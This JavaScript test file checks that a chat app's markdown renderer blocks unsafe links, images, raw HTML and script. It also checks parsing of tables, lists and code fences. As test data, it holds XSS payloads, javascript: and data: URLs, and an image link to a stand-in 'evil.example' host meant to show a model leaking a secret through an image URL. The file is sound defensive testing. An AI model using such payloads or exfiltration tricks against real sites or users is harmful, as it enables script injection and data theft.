import assert from "node:assert/strict";
import test from "node:test";
import { parseInline, parseMarkdown, renderMarkdown, safeHref } from "../public/lib/markdown.js";

/** A tiny DOM stand-in that records exactly what the renderer builds. Only these methods exist, so anything
 * else (innerHTML, insertAdjacentHTML, ...) would throw or be ignored, and we assert on the recorded tree. */
function fakeDocument() {
  const make = (tag) => {
    const node = { tag, children: [], attrs: {}, className: "", text: undefined };
    node.append = (...kids) => node.children.push(...kids);
    node.setAttribute = (name, value) => {
      node.attrs[name] = String(value);
    };
    Object.defineProperty(node, "textContent", {
      set(value) {
        node.text = String(value);
      },
      get() {
        return node.text;
      },
    });
    return node;
  };
  return {
    createElement: make,
    createTextNode: (value) => ({ tag: "#text", text: String(value) }),
    createDocumentFragment: () => make("#fragment"),
  };
}

const walk = (node, visit) => {
  visit(node);
  for (const child of node.children ?? []) walk(child, visit);
};
const tags = (root) => {
  const found = [];
  walk(root, (n) => found.push(n.tag));
  return found;
};
const textOf = (root) => {
  let out = "";
  walk(root, (n) => {
    if (n.text !== undefined) out += n.text;
  });
  return out;
};
const render = (source) => renderMarkdown(fakeDocument(), source);

test("bold, italic, inline code and links parse; snake_case and math stay text", () => {
  assert.deepEqual(parseInline("**bold** and *it* and `code`").map((n) => n.t), ["strong", "text", "em", "text", "code"]);
  assert.deepEqual(parseInline("snake_case_name and 2 * 3 * 4"), [{ t: "text", v: "snake_case_name and 2 * 3 * 4" }]);
  assert.deepEqual(parseInline("**`agents/`**"), [{ t: "strong", c: [{ t: "code", v: "agents/" }] }]);
  const [link] = parseInline("[docs](https://example.com/a?b=c)");
  assert.equal(link.t, "link");
  assert.equal(link.href, "https://example.com/a?b=c");
});

test("only http and https links render as links; everything else stays text", () => {
  for (const url of ["javascript:alert(1)", "data:text/html,x", "vbscript:x", "//evil.example", "ftp://x.example", " javascript:alert(1)"]) {
    const tree = render(`[click](${url})`);
    assert.equal(tags(tree).includes("a"), false, url);
  }
  assert.equal(safeHref("https://ok.example"), "https://ok.example");
  assert.equal(safeHref("HTTP://ok.example/x"), "HTTP://ok.example/x");
  assert.equal(safeHref('https://x.example/"onmouseover=1'), undefined);
});

test("links carry rel and target and nothing else", () => {
  const tree = render("[a](https://example.com)");
  const anchors = [];
  walk(tree, (n) => n.tag === "a" && anchors.push(n));
  assert.equal(anchors.length, 1);
  assert.deepEqual(anchors[0].attrs, { href: "https://example.com", target: "_blank", rel: "noopener noreferrer nofollow" });
});

test("images are never rendered, so a model cannot send data through an image URL", () => {
  const tree = render("![x](https://evil.example/leak?d=secret)\n\n![y](https://evil.example/a.png)");
  assert.equal(tags(tree).includes("img"), false);
  assert.equal(tags(tree).includes("a"), false);
  assert.match(textOf(tree), /!\[x\]/);
});

test("raw HTML and script are shown literally, never built as elements", () => {
  const hostile = '<script>alert(1)</script><img src=x onerror=alert(1)> <b onclick="x">hi</b> </p><iframe src="//x"></iframe>';
  const tree = render(hostile);
  const created = new Set(tags(tree));
  for (const bad of ["script", "img", "iframe", "b"]) assert.equal(created.has(bad), false, bad);
  assert.equal(textOf(tree).includes("<script>alert(1)</script>"), true);
});

test("no element ever receives an attribute other than href, target, rel or class", () => {
  const tree = render('# t\n\n- [a](https://x.example) **b** `c`\n\n| a | b |\n|---|---|\n| 1 | <img onerror=x> |\n\n> q\n\n```js\n<script>\n```');
  walk(tree, (n) => {
    for (const name of Object.keys(n.attrs ?? {})) assert.ok(["href", "target", "rel"].includes(name), `${n.tag}[${name}]`);
  });
});

test("fenced code keeps its text exactly and is not parsed", () => {
  const blocks = parseMarkdown("```bash\nls **x**\n# not a heading\n```\nafter");
  assert.deepEqual(blocks[0], { t: "code", lang: "bash", v: "ls **x**\n# not a heading" });
  assert.equal(blocks[1].t, "p");
});

test("an unterminated fence, as in a streaming reply, becomes code to the end", () => {
  const blocks = parseMarkdown("intro\n```\nline 1\nline 2");
  assert.deepEqual(blocks.map((b) => b.t), ["p", "code"]);
  assert.equal(blocks[1].v, "line 1\nline 2");
});

test("headings, rules, quotes and lists", () => {
  const blocks = parseMarkdown("### Title\n\n---\n\n> quoted\n> more\n\n- a\n  - nested\n- b\n\n1. one\n2. two");
  assert.deepEqual(blocks.map((b) => b.t), ["h", "hr", "quote", "list", "list"]);
  assert.equal(blocks[0].level, 3);
  assert.equal(blocks[3].items.length, 2);
  assert.equal(blocks[3].items[0].children[0].items[0].c[0].v, "nested");
  assert.equal(blocks[4].ordered, true);
});

test("a table parses with a header, separator and rows, and short rows are padded", () => {
  const blocks = parseMarkdown("| Dir | Purpose |\n|-----|---------|\n| `a/` | **x** |\n| b |");
  assert.equal(blocks[0].t, "table");
  assert.equal(blocks[0].head.length, 2);
  assert.equal(blocks[0].rows.length, 2);
  assert.equal(blocks[0].rows[1].length, 2);
  assert.equal(blocks[0].rows[0][0][0].t, "code");
});

test("the overview the agent produced renders as headings, tables and code instead of raw markup", () => {
  const reply = [
    "**NLT-Pi (NeuroLift Pi) – Quick Overview**",
    "",
    "---",
    "",
    "### 📁 Top-level layout ( `/vercel/sandbox/nlt-pi` )",
    "",
    "| Dir / File | Purpose |",
    "|-----------|--------|",
    "| **agents/`** | Code that powers the NLT Coding Agent (NCA). |",
    "| **`mvp/`** | Minimal-viable-product deployment (personal-use only). |",
    "| **`governance.json`, `governance.yaml`** | Policy / governance definitions. |",
    "",
    "```bash",
    "gh repo list --limit 20",
    "```",
  ].join("\n");
  const tree = render(reply);
  const found = new Set(tags(tree));
  for (const wanted of ["strong", "hr", "h5", "table", "th", "td", "pre", "code"]) assert.ok(found.has(wanted), wanted);
  assert.equal(textOf(tree).includes("|-----------|"), false);
  assert.equal(textOf(tree).includes("**mvp"), false);
});

test("deeply nested or pathological input terminates and does not throw", () => {
  const nasty = ["*".repeat(5000), "[".repeat(3000), "`".repeat(3000), "> ".repeat(500) + "x", "  ".repeat(200) + "- x", "| a |\n|-|\n".repeat(200), "**a *b **c *d**"].join("\n");
  const started = Date.now();
  assert.doesNotThrow(() => render(nasty));
  assert.ok(Date.now() - started < 3000, "rendering stayed fast");
  assert.doesNotThrow(() => render(""));
  assert.doesNotThrow(() => render(undefined));
});

test("single newlines inside a paragraph become line breaks", () => {
  const tree = render("one\ntwo");
  assert.deepEqual(tags(tree).filter((t) => t === "br"), ["br"]);
});
